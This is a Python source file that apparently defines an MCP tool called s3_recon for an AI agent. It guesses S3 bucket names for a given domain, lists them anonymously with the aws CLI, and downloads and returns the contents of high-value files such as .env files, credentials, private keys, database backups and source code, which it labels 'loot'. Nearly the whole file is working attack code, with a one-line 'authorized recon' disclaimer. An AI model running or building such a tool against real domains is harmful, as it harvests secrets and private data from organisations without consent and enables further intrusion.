"""
s3_recon — discover and loot a publicly exposed S3 bucket for a domain.

Anonymous / unauthenticated: uses `aws ... --no-sign-request`, so it only reads
what the bucket already serves to the public. Read-only. The `awscli` binary is
present in the MCP server image.
"""
import os
import subprocess
import tempfile

# High-value key substrings, in triage priority order.
PRIORITY = (
    ".env", "config", "settings", "credential", ".pem", ".key",
    ".py", ".js", ".php", ".sql", ".db", ".sqlite", ".bak",
    "readme", "todo", "notes", ".json", ".yml", ".yaml", "docker-compose",
)


def _aws(args, timeout=60):
    return subprocess.run(
        ["aws"] + args, capture_output=True, text=True, timeout=timeout
    )


def register(mcp):

    @mcp.tool()
    def s3_recon(domain: str, max_files: int = 15, max_bytes: int = 20000):
        """Discover and loot a publicly exposed S3 bucket for a domain. Lists the bucket anonymously (no credentials), then downloads and returns the contents of interesting files (.env, source code, database backups, READMEs) so they can be triaged for leaked secrets and vulnerabilities. Read-only; use for authorized recon of a target hosted on Amazon S3."""
        print(f"\n[TOOL] s3_recon -> {domain}\n")

        # 1. Candidate bucket names. S3 website hosting => bucket == hostname.
        candidates = [
            domain,
            f"{domain}-assets",
            f"{domain}-dev",
            f"{domain}-backups",
            f"{domain}-static",
        ]

        bucket, listing = None, []
        for cand in candidates:
            r = _aws(["s3", "ls", f"s3://{cand}", "--no-sign-request", "--recursive"])
            if r.returncode == 0 and r.stdout.strip():
                bucket = cand
                for line in r.stdout.strip().splitlines():
                    parts = line.split(None, 3)  # date time size key
                    if len(parts) == 4:
                        listing.append({"size": parts[2], "key": parts[3]})
                break

        if not bucket:
            return {
                "domain": domain,
                "listable_bucket": None,
                "note": "No publicly listable bucket found for the candidates tried.",
                "candidates_tried": candidates,
            }

        # 2. Pick the high-value objects to loot.
        keys = [o["key"] for o in listing]
        loot_keys = [k for k in keys if any(p in k.lower() for p in PRIORITY)][:max_files]

        # 3. Download anonymously and return their contents for triage.
        loot = {}
        with tempfile.TemporaryDirectory() as tmp:
            for key in loot_keys:
                dest = os.path.join(tmp, key.replace("/", "_"))
                dl = _aws(["s3", "cp", f"s3://{bucket}/{key}", dest, "--no-sign-request"])
                if dl.returncode == 0 and os.path.isfile(dest):
                    try:
                        loot[key] = open(dest, "r", errors="replace").read(max_bytes)
                    except Exception as e:  # noqa: BLE001
                        loot[key] = f"<could not read: {e}>"

        return {
            "domain": domain,
            "listable_bucket": bucket,
            "object_count": len(listing),
            "objects": keys,
            "looted_files": loot,
        }
